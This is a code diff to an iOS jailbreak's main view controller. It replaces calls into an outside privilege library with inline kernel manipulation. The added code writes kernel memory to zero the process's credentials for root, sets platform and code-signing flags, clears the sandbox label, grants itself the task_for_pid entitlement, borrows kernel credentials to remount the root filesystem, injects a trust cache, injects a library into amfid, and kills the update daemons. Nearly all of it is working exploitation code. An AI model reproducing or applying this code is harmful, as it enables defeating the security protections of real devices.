@@ -31,13 +31,13 @@ extern int (*_system)(const char *);
 #include "libjb.h"
 #include "remote_memory.h"
 #include "remote_call.h"
-#include "QiLin.h"
 #include "iokit.h"
 #include "unlocknvram.h"
 #include "SettingsTableViewController.h"
 #include "untar.h"
 #include "multi_path_sploit.h"
 #include "async_wake.h"
+#include "find_port.h"
 
 @interface ViewController ()
 
@@ -210,8 +210,10 @@ int inject_library(pid_t pid, const char *path)
     mach_port_t task_port = MACH_PORT_NULL;
     kern_return_t ret = KERN_FAILURE;
     ret = task_for_pid(mach_task_self(), pid, &task_port);
-    if (!(MACH_PORT_VALID(task_port) && ret == KERN_SUCCESS))
-        task_port = task_for_pid_workaround(pid);
+    if (!(MACH_PORT_VALID(task_port) && ret == KERN_SUCCESS)) {
+        //task_port = task_for_pid_workaround(pid);
+    }
+    
     _assert(MACH_PORT_VALID(task_port), "Failed to inject library.");
     call_remote(task_port, dlopen, 2, REMOTE_CSTRING(path), REMOTE_LITERAL(RTLD_NOW));
     uint64_t error = call_remote(task_port, dlerror, 0);
@@ -301,7 +303,7 @@ uint32_t IKOT_NONE = 0;
 
 void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
     // now make the changes to the port object to make it a task port:
-    uint64_t port_kaddr = getAddressOfPort(getpid(), port);
+    uint64_t port_kaddr = find_port_via_kmem_read(port);
     
     wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
     wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
@@ -477,7 +479,7 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
         return 1;
     }
     
-    uint64_t port_kaddr = getAddressOfPort(getpid(), *port);
+    uint64_t port_kaddr = find_port_via_kmem_read(*port);
     printf("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);
     
     make_port_fake_task_port(*port, remapped_task_addr);
@@ -489,7 +491,7 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
     
     // lck_mtx -- arm: 8  arm64: 16
     const int offsetof_host_special = 0x10;
-    uint64_t host_priv_kaddr = getAddressOfPort(getpid(), mach_host_self());
+    uint64_t host_priv_kaddr = find_port_via_kmem_read(mach_host_self());
     uint64_t realhost_kaddr = rk64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
     wk64(realhost_kaddr + offsetof_host_special + 4 * sizeof(void*), port_kaddr);
     
@@ -941,7 +943,7 @@ int mptcp_die() {
 #define IKOT_HOST_PRIV 4
 
 void make_host_into_host_priv() {
-    uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
+    uint64_t hostport_addr = find_port_via_kmem_read(mach_host_self());
     uint32_t old = rk32(hostport_addr);
     printf("old host type: 0x%08x\n", old);
     wk32(hostport_addr, IO_ACTIVE | IKOT_HOST_PRIV);
@@ -1004,22 +1006,19 @@ int is_symlink(const char *filename) {
     return rv;
 }
 
-typedef struct {
-    kptr_t trust_chain;
-    kptr_t amficache;
-    kptr_t OSBoolean_True;
-    kptr_t OSBoolean_False;
-    kptr_t osunserializexml;
-    kptr_t smalloc;
-    kptr_t allproc;
-    kptr_t add_x0_x0_0x40_ret;
-    kptr_t rootvnode;
-    kptr_t zone_map_ref;
-    kptr_t vfs_context_current;
-    kptr_t vnode_lookup;
-    kptr_t vnode_put;
-    kptr_t kernproc;
-} offsets_t;
+int execCommandAndWait(char *bin, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5) {
+    pid_t pd;
+    const char* args[] = {bin, arg1, arg2, arg3, arg4, arg5,  NULL};
+    
+    int rv = posix_spawn(&pd, bin, NULL, NULL, (char **)&args, NULL);
+    if (!rv) {
+        int a;
+        waitpid(pd, &a, 0);
+    }
+    return rv;
+}
+
+offsets_t offset_struct = { 0 };
 
 // TODO: Add more detailed descriptions for the _assert calls.
 
@@ -1039,7 +1038,6 @@ void exploit(mach_port_t tfp0,
 {
     // Initialize variables.
     int rv = 0;
-    offsets_t offsets = { 0 };
     NSMutableDictionary *md = nil;
     uint64_t vfs_context = 0;
     uint64_t devVnode = 0;
@@ -1069,49 +1067,49 @@ void exploit(mach_port_t tfp0,
     }
     
     {
-        // Find offsets.
+        // Find offsets
         
-        LOG("Finding offsets...");
+        LOG("Finding offset_struct...");
         PROGRESS("Exploiting... (3/50)", 0, 0);
-        offsets.trust_chain = find_trustcache();
-        LOG("trust_chain: " ADDR "\n", offsets.trust_chain);
-        _assert(offsets.trust_chain, "Failed to find trust_chain offset.");
-        offsets.amficache = find_amficache();
-        LOG("amficache: " ADDR "\n", offsets.amficache);
-        _assert(offsets.amficache, "Failed to find amficache offset.");
-        offsets.OSBoolean_True = find_OSBoolean_True();
-        LOG("OSBoolean_True: " ADDR "\n", offsets.OSBoolean_True);
-        _assert(offsets.OSBoolean_True, "Failed to find OSBoolean_True offset.");
-        offsets.OSBoolean_False = find_OSBoolean_False();
-        LOG("OSBoolean_False: " ADDR "\n", offsets.OSBoolean_False);
-        _assert(offsets.OSBoolean_False, "Failed to find OSBoolean_False offset.");
-        offsets.osunserializexml = find_osunserializexml();
-        LOG("osunserializexml: " ADDR "\n", offsets.osunserializexml);
-        _assert(offsets.osunserializexml, "Failed to find osunserializexml offset.");
-        offsets.smalloc = find_smalloc();
-        LOG("smalloc: " ADDR "\n", offsets.smalloc);
-        _assert(offsets.smalloc, "Failed to find smalloc offset.");
-        offsets.allproc = find_allproc();
-        LOG("allproc: " ADDR "\n", offsets.allproc);
-        _assert(offsets.allproc, "Failed to find allproc offset.");
-        offsets.add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret();
-        LOG("add_x0_x0_0x40_ret: " ADDR "\n", offsets.add_x0_x0_0x40_ret);
-        _assert(offsets.add_x0_x0_0x40_ret, "Failed to find add_x0_x0_0x40_ret offset.");
-        offsets.rootvnode = find_rootvnode();
-        LOG("rootvnode: " ADDR "\n", offsets.rootvnode);
-        _assert(offsets.rootvnode, "Failed to find rootvnode offset.");
-        offsets.zone_map_ref = find_zone_map_ref();
-        LOG("zone_map_ref: " ADDR "\n", offsets.zone_map_ref);
-        _assert(offsets.zone_map_ref, "Failed to find zone_map_ref offset.");
-        offsets.vfs_context_current = find_vfs_context_current();
-        LOG("vfs_context_current: " ADDR "\n", offsets.vfs_context_current);
-        _assert(offsets.vfs_context_current, "Failed to find vfs_context_current offset.");
-        offsets.vnode_lookup = find_vnode_lookup();
-        LOG("vnode_lookup: " ADDR "\n", offsets.vnode_lookup);
-        _assert(offsets.vnode_lookup, "Failed to find vnode_lookup offset.");
-        offsets.vnode_put = find_vnode_put();
-        LOG("vnode_put: " ADDR "\n", offsets.vnode_put);
-        _assert(offsets.vnode_put, "Failed to find vnode_put offset.");
+        offset_struct.trust_chain = find_trustcache();
+        LOG("trust_chain: " ADDR "\n", offset_struct.trust_chain);
+        _assert(offset_struct.trust_chain, "Failed to find trust_chain offset.");
+        offset_struct.amficache = find_amficache();
+        LOG("amficache: " ADDR "\n", offset_struct.amficache);
+        _assert(offset_struct.amficache, "Failed to find amficache offset.");
+        offset_struct.OSBoolean_True = find_OSBoolean_True();
+        LOG("OSBoolean_True: " ADDR "\n", offset_struct.OSBoolean_True);
+        _assert(offset_struct.OSBoolean_True, "Failed to find OSBoolean_True offset.");
+        offset_struct.OSBoolean_False = find_OSBoolean_False();
+        LOG("OSBoolean_False: " ADDR "\n", offset_struct.OSBoolean_False);
+        _assert(offset_struct.OSBoolean_False, "Failed to find OSBoolean_False offset.");
+        offset_struct.osunserializexml = find_osunserializexml();
+        LOG("osunserializexml: " ADDR "\n", offset_struct.osunserializexml);
+        _assert(offset_struct.osunserializexml, "Failed to find osunserializexml offset.");
+        offset_struct.smalloc = find_smalloc();
+        LOG("smalloc: " ADDR "\n", offset_struct.smalloc);
+        _assert(offset_struct.smalloc, "Failed to find smalloc offset.");
+        offset_struct.allproc = find_allproc();
+        LOG("allproc: " ADDR "\n", offset_struct.allproc);
+        _assert(offset_struct.allproc, "Failed to find allproc offset.");
+        offset_struct.add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret();
+        LOG("add_x0_x0_0x40_ret: " ADDR "\n", offset_struct.add_x0_x0_0x40_ret);
+        _assert(offset_struct.add_x0_x0_0x40_ret, "Failed to find add_x0_x0_0x40_ret offset.");
+        offset_struct.rootvnode = find_rootvnode();
+        LOG("rootvnode: " ADDR "\n", offset_struct.rootvnode);
+        _assert(offset_struct.rootvnode, "Failed to find rootvnode offset.");
+        offset_struct.zone_map_ref = find_zone_map_ref();
+        LOG("zone_map_ref: " ADDR "\n", offset_struct.zone_map_ref);
+        _assert(offset_struct.zone_map_ref, "Failed to find zone_map_ref offset.");
+        offset_struct.vfs_context_current = find_vfs_context_current();
+        LOG("vfs_context_current: " ADDR "\n", offset_struct.vfs_context_current);
+        _assert(offset_struct.vfs_context_current, "Failed to find vfs_context_current offset.");
+        offset_struct.vnode_lookup = find_vnode_lookup();
+        LOG("vnode_lookup: " ADDR "\n", offset_struct.vnode_lookup);
+        _assert(offset_struct.vnode_lookup, "Failed to find vnode_lookup offset.");
+        offset_struct.vnode_put = find_vnode_put();
+        LOG("vnode_put: " ADDR "\n", offset_struct.vnode_put);
+        _assert(offset_struct.vnode_put, "Failed to find vnode_put offset.");
         LOG("Successfully found offsets.");
     }
     
@@ -1125,27 +1123,25 @@ void exploit(mach_port_t tfp0,
     }
     
     {
-        // Initialize QiLin.
-        
-        LOG("Initializing QiLin...");
-        PROGRESS("Exploiting... (5/50)", 0, 0);
-        rv = initQiLin(tfp0, kernel_base);
-        LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0, "Failed to initialize QiLin.");
-        LOG("Successfully initialized QiLin.");
-    }
-    
-    {
         // Rootify.
         
         LOG("Rootifying...");
         PROGRESS("Exploiting... (6/50)", 0, 0);
-        rv = rootifyMe();
-        LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0, "Failed to rootify.");
-        rv = getuid();
-        LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0, "Failed to rootify.");
+        
+        uint64_t proc = proc_of_pid(getpid());
+        uint64_t ucred = rk64(proc + 0x100);
+   
+        wk32(ucred + 0x18, 0);
+        wk32(ucred + 0x1c, 0);
+        wk32(ucred + 0x20, 0);
+        wk32(ucred + 0x24, 1);
+        wk32(ucred + 0x28, 0);
+        wk32(ucred + 0x68, 0);
+        wk32(ucred + 0x6c, 0);
+        
+        LOG("uid: " "%d" "\n", getuid());
+        
+        _assert(getuid() == 0, "Failed to rootify.");
         LOG("Successfully rootified.");
     }
     
@@ -1154,7 +1150,20 @@ void exploit(mach_port_t tfp0,
         
         LOG("Platformizing...");
         PROGRESS("Exploiting... (7/50)", 0, 0);
-        rv = platformizeMe();
+        
+        uint64_t proc = proc_of_pid(getpid());
+        uint64_t task = rk64(proc + 0x18);
+        uint32_t t_flags = rk32(task + 0x3a0);
+   
+        wk32(task + 0x3a0, t_flags | 0x400);
+        
+        uint32_t csflags = rk32(proc + 0x2a8);
+        wk32(proc + 0x2a8, csflags | 0x24004001);
+        
+        t_flags = rk32(task + 0x3a0);
+        csflags = rk32(proc + 0x2a8);
+        
+        rv = !((t_flags & 0x400) && (csflags & 0x24004001));
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0, "Failed to platformize.");
         LOG("Successfully platformized.");
@@ -1165,7 +1174,17 @@ void exploit(mach_port_t tfp0,
         
         LOG("Escaping Sandbox...");
         PROGRESS("Exploiting... (8/50)", 0, 0);
-        ShaiHuludMe(0);
+        
+        uint64_t proc = proc_of_pid(getpid());
+        uint64_t ucred = rk64(proc + 0x100);
+        uint64_t cr_label = rk64(ucred + 0x78);
+
+        wk64(cr_label + 0x10, 0);
+        
+        rv = rk64(cr_label + 0x10) ? 1 : 0;
+        LOG("rv: " "%d" "\n", rv);
+        
+        _assert(rv == 0, "Failed to escape sandbox");
         LOG("Successfully escaped Sandbox.");
     }
     
@@ -1198,12 +1217,44 @@ void exploit(mach_port_t tfp0,
     }
     
     {
-        // Borrow entitlements from sysdiagnose.
+        // Initialize kexecute.
         
-        LOG("Borrowing entitlements from sysdiagnose...");
+        LOG("Initializing kexecute...");
+        PROGRESS("Exploiting... (15/50)", 0, 0);
+        init_kexecute(offset_struct.add_x0_x0_0x40_ret);
+        LOG("Successfully initialized kexecute.");
+    }
+    
+    {
+        // Get tfp
+        
+        LOG("Getting task_for_pid entitlement");
         PROGRESS("Exploiting... (10/50)", 0, 0);
-        borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", "--help");
-        LOG("Successfully borrowed entitlements from sysdiagnose.");
+        
+        uint64_t proc = proc_of_pid(getpid());
+        uint64_t ucred = rk64(proc + 0x100);
+        uint64_t cr_label = rk64(ucred + 0x78);
+        uint64_t entitlements = rk64(cr_label + 0x8);
+        
+        char *key = "task_for_pid-allow";
+        size_t len = strlen(key) + 1;
+        uint64_t ks = kmem_alloc(len);
+        wkbuffer(ks, key, (unsigned int)len);
+        
+        uint64_t vtab = rk64(entitlements);
+        uint64_t f = rk64(vtab + sizeof(void*) * 0x1F);
+        
+        kexecute(f, entitlements, ks, offset_struct.OSBoolean_True, 0, 0, 0, 0);
+        
+        f = rk64(vtab + sizeof(void*) * 0x26);
+        uint64_t ret = kexecute(f, entitlements, ks, 0, 0, 0, 0, 0);
+        if (ret) ret = zm_fix_addr(ret, offset_struct.zone_map_ref);
+        
+        kmem_free(ks, len);
+        
+        _assert(ret != 0, "Failed to get tfp");
+        
+        LOG("Successfully got tfp");
         
         // We now have Task_for_pid.
     }
@@ -1262,20 +1313,11 @@ void exploit(mach_port_t tfp0,
     }
     
     {
-        // Initialize kexecute.
-        
-        LOG("Initializing kexecute...");
-        PROGRESS("Exploiting... (15/50)", 0, 0);
-        init_kexecute(offsets.add_x0_x0_0x40_ret);
-        LOG("Successfully initialized kexecute.");
-    }
-    
-    {
         // Get vfs_context.
         
         LOG("Getting vfs_context...");
         PROGRESS("Exploiting... (16/50)", 0, 0);
-        vfs_context = _vfs_context(offsets.vfs_context_current, offsets.zone_map_ref);
+        vfs_context = _vfs_context(offset_struct.vfs_context_current, offset_struct.zone_map_ref);
         LOG("vfs_context: " ADDR "\n", vfs_context);
         _assert(vfs_context, "Failed to get vfs_context.");
         LOG("Successfully got vfs_context.");
@@ -1286,7 +1328,7 @@ void exploit(mach_port_t tfp0,
         
         LOG("Getting dev vnode...");
         PROGRESS("Exploiting... (17/50)", 0, 0);
-        devVnode = getVnodeAtPath(vfs_context, "/dev/disk0s1s1", offsets.vnode_lookup);
+        devVnode = getVnodeAtPath(vfs_context, "/dev/disk0s1s1", offset_struct.vnode_lookup);
         LOG("devVnode: " ADDR "\n", devVnode);
         _assert(devVnode, "Failed to get dev vnode.");
         LOG("Successfully got dev vnode.");
@@ -1306,7 +1348,7 @@ void exploit(mach_port_t tfp0,
         
         LOG("Cleaning up dev vnode...");
         PROGRESS("Exploiting... (19/50)", 0, 0);
-        rv = _vnode_put(offsets.vnode_put, devVnode);
+        rv = _vnode_put(offset_struct.vnode_put, devVnode);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0, "Failed to clean up dev vnode.");
         LOG("Successfully cleaned up dev vnode.");
@@ -1339,7 +1381,23 @@ void exploit(mach_port_t tfp0,
             rv = mkdir("/var/tmp/rootfsmnt", 0755);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0, "Failed to remount RootFS.");
-            rv = spawnAndShaiHulud("/sbin/mount_apfs", "/dev/disk0s1s1", "/var/tmp/rootfsmnt", NULL, NULL, NULL);
+            
+            uint64_t kernproc = proc_of_pid(0);
+            uint64_t selfproc = proc_of_pid(getpid());
+            uint64_t kerncred = rk64(kernproc + 0x100);
+            uint64_t selfcred = rk64(selfproc + 0x100);
+            
+            wk64(selfproc + 0x100, kerncred);
+            
+            struct hfs_mount_args mntargs;
+            bzero(&mntargs, sizeof(struct hfs_mount_args));
+            mntargs.fspec = "/dev/disk0s1s1";
+            mntargs.hfs_mask = 1;
+            gettimeofday(NULL, &mntargs.hfs_timezone);
+            rv = mount("apfs", "/var/tmp/rootfsmnt", 0, (void *)&mntargs);
+
+            wk64(selfproc + 0x100, selfcred);
+            
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0, "Failed to remount RootFS.");
             
@@ -1347,7 +1405,17 @@ void exploit(mach_port_t tfp0,
             
             LOG("Borrowing entitlements from fsck_apfs...");
             PROGRESS("Exploiting... (22/50)", 0, 0);
-            borrowEntitlementsFromDonor("/sbin/fsck_apfs", NULL);
+            
+            const char* args[] = {"/sbin/fsck_apfs", NULL};
+            int pd;
+            rv = posix_spawn(&pd, "/sbin/fsck_apfs", NULL, NULL, (char **)&args, NULL);
+            kill(pd, SIGSTOP);
+            
+            uint64_t fsckproc = proc_of_pid(pd);
+            uint64_t fsckcred = rk64(fsckproc + 0x100);
+            
+            wk64(selfproc + 0x100, fsckcred);
+            
             LOG("Successfully borrowed entitlements from fsck_apfs.");
             
             // We now have fs_snapshot_rename.
@@ -1372,6 +1440,9 @@ void exploit(mach_port_t tfp0,
             }
             LOG("Successfully renamed system snapshot.");
             
+            wk64(selfproc + 0x100, selfproc);
+            kill(pd, SIGKILL);
+            
             // Reboot.
             
             LOG("Rebooting...");
@@ -1382,7 +1453,7 @@ void exploit(mach_port_t tfp0,
             _assert(rv == 0, "Failed to remount RootFS.");
             LOG("Successfully rebooted.");
         }
-        rootfs_vnode = rk64(offsets.rootvnode);
+        rootfs_vnode = rk64(offset_struct.rootvnode);
         v_mount = rk64(rootfs_vnode + 0xd8);
         v_flag = rk32(v_mount + 0x70);
         v_flag = v_flag & ~MNT_NOSUID;
@@ -1611,13 +1682,13 @@ void exploit(mach_port_t tfp0,
         // Inject trust cache
         
         PROGRESS("Exploiting... (28/50)", 0, 0);
-        printf("trust_chain = 0x%llx\n", offsets.trust_chain);
+        printf("trust_chain = 0x%llx\n", offset_struct.trust_chain);
         
-        mem.next = rk64(offsets.trust_chain);
+        mem.next = rk64(offset_struct.trust_chain);
         *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
         *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;
         
-        rv = grab_hashes("/jb", kread, offsets.amficache, mem.next);
+        rv = grab_hashes("/jb", kread, offset_struct.amficache, mem.next);
         printf("rv = %d, numhash = %d\n", rv, numhash);
         
         length = (sizeof(mem) + numhash * 20 + 0xFFFF) & ~0xFFFF;
@@ -1627,7 +1698,7 @@ void exploit(mach_port_t tfp0,
         mem.count = numhash;
         kwrite(kernel_trust, &mem, sizeof(mem));
         kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
-        wk64(offsets.trust_chain, kernel_trust);
+        wk64(offset_struct.trust_chain, kernel_trust);
         
         free(allhash);
         free(allkern);
@@ -1660,7 +1731,7 @@ void exploit(mach_port_t tfp0,
         
         LOG("Setting HSP4...");
         PROGRESS("Exploiting... (30/50)", 0, 0);
-        rv = remap_tfp0_set_hsp4(&tfp0, offsets.zone_map_ref);
+        rv = remap_tfp0_set_hsp4(&tfp0, offset_struct.zone_map_ref);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0, "Failed to set HSP4.");
         LOG("Successfully set HSP4.");
@@ -1686,7 +1757,7 @@ void exploit(mach_port_t tfp0,
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0, "Failed to patch amfid.");
         }
-        rv = inject_library(findPidOfProcess("amfid"), "/jb/amfid_payload.dylib");
+        rv = inject_library(pid_of_procName("amfid"), "/jb/amfid_payload.dylib");
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0, "Failed to patch amfid.");
         rv = access("/var/tmp/amfid_payload.alive", F_OK);
@@ -1732,13 +1803,13 @@ void exploit(mach_port_t tfp0,
         md[@"Program"] = @"/jb/jailbreakd";
         md[@"EnvironmentVariables"] = [[NSMutableDictionary alloc] init];
         md[@"EnvironmentVariables"][@"KernelBase"] = [NSString stringWithFormat:@ADDR, kernel_base];
-        md[@"EnvironmentVariables"][@"KernProcAddr"] = [NSString stringWithFormat:@ADDR, rk64(findKernelSymbol("_kernproc"))];
-        md[@"EnvironmentVariables"][@"ZoneMapOffset"] = [NSString stringWithFormat:@ADDR, offsets.zone_map_ref - (kernel_base - KERNEL_SEARCH_ADDRESS)];
-        md[@"EnvironmentVariables"][@"AddRetGadget"] = [NSString stringWithFormat:@ADDR, offsets.add_x0_x0_0x40_ret];
-        md[@"EnvironmentVariables"][@"OSBooleanTrue"] = [NSString stringWithFormat:@ADDR, offsets.OSBoolean_True];
-        md[@"EnvironmentVariables"][@"OSBooleanFalse"] = [NSString stringWithFormat:@ADDR, offsets.OSBoolean_False];
-        md[@"EnvironmentVariables"][@"OSUnserializeXML"] = [NSString stringWithFormat:@ADDR, offsets.osunserializexml];
-        md[@"EnvironmentVariables"][@"Smalloc"] = [NSString stringWithFormat:@ADDR, offsets.smalloc];
+        md[@"EnvironmentVariables"][@"KernProcAddr"] = [NSString stringWithFormat:@ADDR, proc_of_pid(0)];
+        md[@"EnvironmentVariables"][@"ZoneMapOffset"] = [NSString stringWithFormat:@ADDR, offset_struct.zone_map_ref - (kernel_base - KERNEL_SEARCH_ADDRESS)];
+        md[@"EnvironmentVariables"][@"AddRetGadget"] = [NSString stringWithFormat:@ADDR, offset_struct.add_x0_x0_0x40_ret];
+        md[@"EnvironmentVariables"][@"OSBooleanTrue"] = [NSString stringWithFormat:@ADDR, offset_struct.OSBoolean_True];
+        md[@"EnvironmentVariables"][@"OSBooleanFalse"] = [NSString stringWithFormat:@ADDR, offset_struct.OSBoolean_False];
+        md[@"EnvironmentVariables"][@"OSUnserializeXML"] = [NSString stringWithFormat:@ADDR, offset_struct.osunserializexml];
+        md[@"EnvironmentVariables"][@"Smalloc"] = [NSString stringWithFormat:@ADDR, offset_struct.smalloc];
         md[@"UserName"] = @"root";
         md[@"MachServices"] = [[NSMutableDictionary alloc] init];
         md[@"MachServices"][@"zone.sparkes.jailbreakd"] = [[NSMutableDictionary alloc] init];
@@ -1842,7 +1913,19 @@ void exploit(mach_port_t tfp0,
             
             LOG("Borrowing entitlements from fsck_apfs...");
             PROGRESS("Exploiting... (36/50)", 0, 0);
-            borrowEntitlementsFromDonor("/sbin/fsck_apfs", NULL);
+            
+            const char* args[] = {"/sbin/fsck_apfs", NULL};
+            int pd;
+            rv = posix_spawn(&pd, "/sbin/fsck_apfs", NULL, NULL, (char **)&args, NULL);
+            kill(pd, SIGSTOP);
+            
+            uint64_t fsckproc = proc_of_pid(pd);
+            uint64_t selfproc = proc_of_pid(getpid());
+            uint64_t fsckcred = rk64(fsckproc + 0x100);
+            uint64_t selfcred = rk64(selfproc + 0x100);
+            
+            wk64(selfproc + 0x100, fsckcred);
+            
             LOG("Successfully borrowed entitlements from fsck_apfs.");
             
             // We now have fs_snapshot_rename.
@@ -1875,7 +1958,24 @@ void exploit(mach_port_t tfp0,
                     rv = mkdir("/var/tmp/rootfsmnt", 0755);
                     LOG("rv: " "%d" "\n", rv);
                     _assert(rv == 0, "Failed to remount RootFS.");
-                    rv = spawnAndShaiHulud("/sbin/mount_apfs", "-s", "electra-prejailbreak", "/", "/var/tmp/rootfsmnt", NULL);
+                    
+                    pid_t pd;
+                    const char* args[] = {"/sbin/mount_apfs", "-s", "electra-prejailbreak", "/", "/var/tmp/rootfsmnt",  NULL};
+                    
+                    posix_spawnattr_t attr;
+                    posix_spawnattr_init(&attr);
+                    posix_spawnattr_setflags(&attr, POSIX_SPAWN_START_SUSPENDED);
+                    
+                    rv = posix_spawn(&pd, "/sbin/mount_apfs", NULL, &attr, (char **)&args, NULL);
+                    
+                    uint64_t mntproc = proc_of_pid(pd);
+                    uint64_t kernproc = proc_of_pid(0);
+                    uint64_t kerncred = rk64(kernproc + 0x100);
+                    
+                    wk64(mntproc + 0x100, kerncred);
+                    
+                    kill(pd, SIGCONT);
+      
                     LOG("rv: " "%d" "\n", rv);
                     _assert(rv == 0, "Failed to remount RootFS.");
                     rv = easyPosixSpawn([NSURL fileURLWithPath:@"/jb/rsync"], @[@"-vaxcH", @"--progress", @"--delete-after", @"--exclude=/Developer", @"/var/tmp/rootfsmnt/.", @"/"]);
@@ -1901,7 +2001,25 @@ void exploit(mach_port_t tfp0,
                     rv = mkdir("/var/tmp/rootfsmnt", 0755);
                     LOG("rv: " "%d" "\n", rv);
                     _assert(rv == 0, "Failed to remount RootFS.");
-                    rv = spawnAndShaiHulud("/sbin/mount_apfs", "-s", "orig-fs", "/", "/var/tmp/rootfsmnt", NULL);
+                    
+                     
+                     pid_t pd;
+                     const char* args[] = {"/sbin/mount_apfs", "-s", "orig-fs", "/", "/var/tmp/rootfsmnt",  NULL};
+                     
+                     posix_spawnattr_t attr;
+                     posix_spawnattr_init(&attr);
+                     posix_spawnattr_setflags(&attr, POSIX_SPAWN_START_SUSPENDED);
+                     
+                     rv = posix_spawn(&pd, "/sbin/mount_apfs", NULL, &attr, (char **)&args, NULL);
+                     
+                     uint64_t mntproc = proc_of_pid(pd);
+                     uint64_t kernproc = proc_of_pid(0);
+                     uint64_t kerncred = rk64(kernproc + 0x100);
+                     
+                     wk64(mntproc + 0x100, kerncred);
+                     
+                     kill(pd, SIGCONT);
+                     
                     LOG("rv: " "%d" "\n", rv);
                     _assert(rv == 0, "Failed to remount RootFS.");
                     rv = easyPosixSpawn([NSURL fileURLWithPath:@"/jb/rsync"], @[@"-vaxcH", @"--progress", @"--delete-after", @"--exclude=/Developer", @"/var/tmp/rootfsmnt/.", @"/"]);
@@ -1917,7 +2035,24 @@ void exploit(mach_port_t tfp0,
                 rv = mkdir("/var/tmp/rootfsmnt", 0755);
                 LOG("rv: " "%d" "\n", rv);
                 _assert(rv == 0, "Failed to remount RootFS.");
-                rv = spawnAndShaiHulud("/sbin/mount_apfs", "-s", strdup(systemSnapshot()), "/", "/var/tmp/rootfsmnt", NULL);
+                
+                pid_t pd;
+                const char* args[] = {"/sbin/mount_apfs", "-s", strdup(systemSnapshot()), "/", "/var/tmp/rootfsmnt",  NULL};
+                
+                posix_spawnattr_t attr;
+                posix_spawnattr_init(&attr);
+                posix_spawnattr_setflags(&attr, POSIX_SPAWN_START_SUSPENDED);
+                
+                rv = posix_spawn(&pd, "/sbin/mount_apfs", NULL, &attr, (char **)&args, NULL);
+                
+                uint64_t mntproc = proc_of_pid(pd);
+                uint64_t kernproc = proc_of_pid(0);
+                uint64_t kerncred = rk64(kernproc + 0x100);
+                
+                wk64(mntproc + 0x100, kerncred);
+                
+                kill(pd, SIGCONT);
+                
                 LOG("rv: " "%d" "\n", rv);
                 _assert(rv == 0, "Failed to remount RootFS.");
                 rv = easyPosixSpawn([NSURL fileURLWithPath:@"/jb/rsync"], @[@"-vaxcH", @"--progress", @"--delete-after", @"--exclude=/Developer", @"/var/tmp/rootfsmnt/.", @"/"]);
@@ -1925,6 +2060,9 @@ void exploit(mach_port_t tfp0,
                 _assert(rv == 0, "Failed to remount RootFS.");
             }
             LOG("Successfully renamed system snapshot back.");
+            
+            wk64(selfproc + 0x100, selfcred);
+            kill(pd, SIGKILL);
             
             // Clean up UserFS.
             
@@ -2128,14 +2266,14 @@ void exploit(mach_port_t tfp0,
         md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
         _assert(md != nil, "Failed to allow SpringBoard to show non-default system apps.");
         for (int i = 0; !(i >= 5 || [md[@"SBShowNonDefaultSystemApps"] isEqual:@(YES)]); i++) {
-            rv = kill(findPidOfProcess("cfprefsd"), SIGSTOP);
+            rv = kill(pid_of_procName("cfprefsd"), SIGSTOP);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0, "Failed to allow SpringBoard to show non-default system apps.");
             md[@"SBShowNonDefaultSystemApps"] = @(YES);
             rv = [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 1, "Failed to allow SpringBoard to show non-default system apps.");
-            rv = kill(findPidOfProcess("cfprefsd"), SIGKILL);
+            rv = kill(pid_of_procName("cfprefsd"), SIGKILL);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0, "Failed to allow SpringBoard to show non-default system apps.");
             md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
@@ -2177,13 +2315,13 @@ void exploit(mach_port_t tfp0,
                 LOG("rv: " "%d" "\n", rv);
                 _assert(rv == 0, "Failed to disable auto updates.");
             }
-            if (findPidOfProcess("softwareupdated")) {
-                rv = kill(findPidOfProcess("softwareupdated"), SIGKILL);
+            if (pid_of_procName("softwareupdated")) {
+                rv = kill(pid_of_procName("softwareupdated"), SIGKILL);
                 LOG("rv: " "%d" "\n", rv);
                 _assert(rv == 0, "Failed to disable auto updates.");
             }
-            if (findPidOfProcess("softwareupdateservicesd")) {
-                rv = kill(findPidOfProcess("softwareupdateservicesd"), SIGKILL);
+            if (pid_of_procName("softwareupdateservicesd")) {
+                rv = kill(pid_of_procName("softwareupdateservicesd"), SIGKILL);
                 LOG("rv: " "%d" "\n", rv);
                 _assert(rv == 0, "Failed to disable auto updates.");
             }
@@ -2221,7 +2359,7 @@ void exploit(mach_port_t tfp0,
             }
         }
     }
-    
+
     {
         if (increase_memory_limit) {
             // Increase memory limit.
